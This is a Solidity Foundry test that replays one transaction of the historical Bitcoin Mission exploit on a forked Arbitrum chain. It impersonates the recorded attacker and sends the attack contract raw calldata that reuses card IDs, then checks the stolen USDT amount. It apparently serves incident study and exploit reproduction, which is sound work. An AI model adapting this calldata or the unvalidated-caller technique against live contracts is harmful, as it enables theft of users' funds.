// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

/*
    @KeyInfo
    - Total Lost: ~$3.2M over 424 transactions
    - Attacker: 0xbf4fE9c88660D628e11702Ef780376DD16495b16
    - Attack Contract: 0xDd4384a8C21FEf787CC93C02B1c0d1efAC6119c5
    - Representative Tx: https://arbiscan.io/tx/0xc0ef229256b2a6bc076a2de136f00f6161c959e4c56240bdb580ae2fde177c0b
    - Analysis: https://blockthreat.substack.com/p/blockthreat-week-17-2025

    Bitcoin Mission's overPaper path did not sufficiently validate its caller or
    prevent reuse of card IDs. The attacker repeated the withdrawal over several
    days. This test replays one representative transaction against pre-attack state.
*/

interface IERC20BitcoinMission {
    function balanceOf(
        address account
    ) external view returns (uint256);
}

contract BitcoinMissionExploitTest is Test {
    address private constant ATTACKER = 0xbf4fE9c88660D628e11702Ef780376DD16495b16;
    address private constant ATTACK_CONTRACT = 0xDd4384a8C21FEf787CC93C02B1c0d1efAC6119c5;
    address private constant PROFIT_RECEIVER = 0xdb93105420181d35551754069d34da68a4185193;
    IERC20BitcoinMission private constant USDT = IERC20BitcoinMission(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);

    function setUp() public {
        vm.createSelectFork("arbitrum", 329_034_526);
        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Attack contract");
        vm.label(PROFIT_RECEIVER, "Profit receiver");
    }

    function testExploit() public {
        uint256 usdtBefore = USDT.balanceOf(PROFIT_RECEIVER);
        bytes memory attackCalldata =
            hex"fe0e7ecb0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000db93105420181d35551754069d34da68a4185193000000000000000000000000000000000000000000000000000000000000000e0000000000000000000000000000000000000000000000000000000000004c480000000000000000000000000000000000000000000000000000000000004c490000000000000000000000000000000000000000000000000000000000004c4a0000000000000000000000000000000000000000000000000000000000004c4b0000000000000000000000000000000000000000000000000000000000004cb00000000000000000000000000000000000000000000000000000000000004cb10000000000000000000000000000000000000000000000000000000000004cb20000000000000000000000000000000000000000000000000000000000004cb30000000000000000000000000000000000000000000000000000000000004cb40000000000000000000000000000000000000000000000000000000000004cb50000000000000000000000000000000000000000000000000000000000004cb60000000000000000000000000000000000000000000000000000000000004cb70000000000000000000000000000000000000000000000000000000000004cb80000000000000000000000000000000000000000000000000000000000004cb9";

        vm.prank(ATTACKER, ATTACKER);
        (bool success, bytes memory returnData) = ATTACK_CONTRACT.call(attackCalldata);
        if (!success) emit log_named_bytes("revert data", returnData);
        assertTrue(success, "historical Bitcoin Mission exploit call reverted");

        uint256 usdtProfit = USDT.balanceOf(PROFIT_RECEIVER) - usdtBefore;
        emit log_named_decimal_uint("USDT profit", usdtProfit, 6);
        assertEq(usdtProfit, 1441.658811e6);
    }
}
